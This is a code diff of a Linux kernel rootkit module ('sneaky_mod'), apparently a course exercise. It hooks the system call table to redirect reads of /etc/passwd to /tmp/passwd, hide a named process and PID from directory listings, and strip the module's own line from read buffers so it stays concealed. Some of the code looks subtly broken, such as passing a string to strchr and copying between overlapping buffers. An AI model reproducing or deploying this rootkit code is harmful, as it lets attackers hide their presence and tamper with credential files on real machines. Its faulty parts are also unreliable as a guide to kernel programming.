@@ -20,9 +20,14 @@
 #define BUFFLEN 256
 MODULE_LICENSE("rg239");
 
-static char * sneaky_process_id = "00000000";
+
+//module parameter
+static char * sneaky_process_id = "";
 module_param(sneaky_process_id, charp, 0);
 MODULE_PARM_DESC(sneaky_process_id, "A character string");
+
+ const char * original_file = "/etc/passwd";
+ const char * sneaky_file = "/tmp/passwd";
 
 
 //getdents will fill in an array of “struct linux_dirent” objects, one for each file or directory found within a directory. 
@@ -68,11 +73,16 @@ asmlinkage int (*original_getdents)(unsigned int fd, struct linux_dirent *dirp, 
 asmlinkage int sneaky_sys_open(const char *pathname, int flags)
 {
   printk(KERN_INFO "Very, very Sneaky!\n");
-  return original_call(pathname, flags);
+  if(strcmp(pathname, original_file) == 0){
+    // return original_call(sneaky_file, flags);
+    size_t len = strlen(sneaky_file);
+    copy_to_user((void*)pathname, sneaky_file, len + 1);
+  }
+    return original_call(pathname, flags);
 }
 
 
-
+//modify the getdents syscall
 asmlinkage int sneaky_sys_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count){
 
   // char sneaky_id[40];
@@ -84,11 +94,12 @@ asmlinkage int sneaky_sys_getdents(unsigned int fd, struct linux_dirent *dirp, u
     int current_reclen;
     size_t length;
 
-    while(current_position < num && current_position >= 0){
+    while(current_position < num ){
 
       current_dir = (struct linux_dirent *)(current_position + (char*)dirp);
       current_reclen = (int)current_dir->d_reclen;
 
+      //if found 
       if((strcmp(current_dir->d_name, "sneaky_process") == 0) || (strcmp(current_dir->d_name, sneaky_process_id) == 0)){
 
         length = (size_t)( num - (size_t)(((char *)current_dir + current_dir->d_reclen) - (char*)dirp));
@@ -104,6 +115,27 @@ asmlinkage int sneaky_sys_getdents(unsigned int fd, struct linux_dirent *dirp, u
     
 }
 
+
+asmlinkage int sneaky_sys_read(int fd, void * buf, size_t count){
+
+  ssize_t return_bytes = original_read(fd, buf, count);
+  char * temp_ptr;
+  const char * find_string = "sneaky_mod"; 
+  char * find_ptr = strstr(buf, find_string); //finds the first occurence of sneaky_mod
+
+  if( find_ptr != NULL){
+    temp_ptr = strchr(find_ptr, "\n"); //finds the first occurence of \n, find the end of the buffer 
+    if(temp_ptr != NULL){
+      ssize_t length = return_bytes - (ssize_t)(find_ptr - (char*)buf);
+      memcpy(find_ptr, temp_ptr + 1, length);
+      return_bytes = return_bytes - (ssize_t)(temp_ptr - find_ptr);
+    }
+  }
+
+  return return_bytes;
+
+  
+}
 
 
 
@@ -133,7 +165,9 @@ static int initialize_sneaky_module(void)
   original_getdents = (void*)*(sys_call_table + __NR_getdents);
   *(sys_call_table + __NR_getdents) = (unsigned long)sneaky_sys_getdents;
 
-  
+   original_read = (void*)*(sys_call_table + __NR_read);
+  *(sys_call_table + __NR_read) = (unsigned long)sneaky_sys_read;
+
   //Revert page to read-only
   pages_ro(page_ptr, 1);
   //Turn write protection mode back on
@@ -162,7 +196,9 @@ static void exit_sneaky_module(void)
   //function address. Will look like malicious code was never there!
   *(sys_call_table + __NR_open) = (unsigned long)original_call;
   *(sys_call_table + __NR_getdents) = (unsigned long)original_getdents;
+  *(sys_call_table + __NR_read) = (unsigned long)original_read;
   
+
 
   //Revert page to read-only
   pages_ro(page_ptr, 1);
